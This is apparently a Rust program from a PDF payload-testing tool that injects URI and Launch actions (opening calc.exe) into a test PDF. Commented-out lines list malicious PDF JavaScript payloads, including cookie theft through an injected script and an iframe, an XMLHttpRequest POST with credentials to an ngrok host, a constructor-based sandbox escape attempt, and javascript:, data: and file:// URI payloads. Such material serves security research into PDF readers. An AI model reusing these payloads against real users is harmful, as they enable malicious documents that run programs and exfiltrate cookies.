use lopdf::Document;
use pdf_writer::actions::javascript::javascript_test_case;
use pdf_writer::actions::pdf_creator::create_test_pdf;
use pdf_writer::actions::uri::uri_test_case;
use pdf_writer::actions::launch::launch_test_case;
use pdf_writer::print_variables;
use std::fmt::Debug;
use std::path::Path;

fn main() {
    if !Path::new("test.pdf").exists() {
        create_test_pdf();
    }

    let mut doc = Document::load("test.pdf").expect("Could not load file");
    
    /*
    // let js_code = "app.alert('Hello World!'); Object.getPrototypeof(function*(){}).constructor = null; ((function*(){}).constructor(\"document.write('<script>confirm(document.cookie);</script><iframe src=https://8d19-38-99-100-7.ngrok-free.app>');\"));";
    // let js_code = "app.alert('calc.exe!'); app.OpenDoc('/C/Windows/system32/calc.exe')";
    // let js_code = "app.alert('cal!'); app.launchURL('https://www.youtube.com/', true)";
    // let js_code = "app.alert('console!'); console.println(\"1111111111111111111111\"); windows.confirm(document.cookie); ";
    // let js_code = "app.alert('URI'); var xmlhttp = new XMLHttpRequest(); var myUrl = \"https://8d19-38-99-100-7.ngrok-free.app\"; xmlhttp.open(\"POST\", myUrl, true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader(\"Content-Type\", \"text/plain;charset=UTF-8\"); xmlhttp.send(JSON.stringify({\"a\":true}));";
    //let js_code = "app.alert('eval'); eval(\"app.alert('this is from eval');\")";
    // let js_code = "app.alert('Test'); app.loadPolicyFile(\"https://2362-38-99-100-7.ngrok-free.app\");"; 
    // let js_code = "app.addMenuItem({ cName: \"ztest\", cUser: \"ztest\", cParent: \"Help\", cExec: \"app.lanchURL('https://63bf-38-99-100-7.ngrok-free.app');\", nPos: 0 });";
    let js_payload = "app.alert(\"Test\");";
    let js_action_id = javascript_test_case(&mut doc, &js_payload);
    */ 

    // uri_action_dict.set("URI", Object::string_literal("https://www.google.com"));
    // uri_action_dict.set("URI", Object::string_literal("javascript:prompt(1)"));
    // uri_action_dict.set("URI", Object::string_literal("data:text/html,<script>alert(1);</script>"));
    // uri_action_dict.set("URI", Object::string_literal("file:///C:/Windows/System32/calc.exe"));
    let uri = "http://www.google.com";
    let uri_action_id = uri_test_case(&mut doc, uri);

    let path = "C:\\Windows\\System32\\calc.exe";
    let path_action_id = launch_test_case(&mut doc, path);

    print_variables!(
        "Uri Annotation ID" => uri_action_id,
        "Path Annotation ID" => path_action_id
    );
    

    doc.save("test.pdf").expect("Failed to save PDF");
    println!("PDF modification has been successfully performed");
}
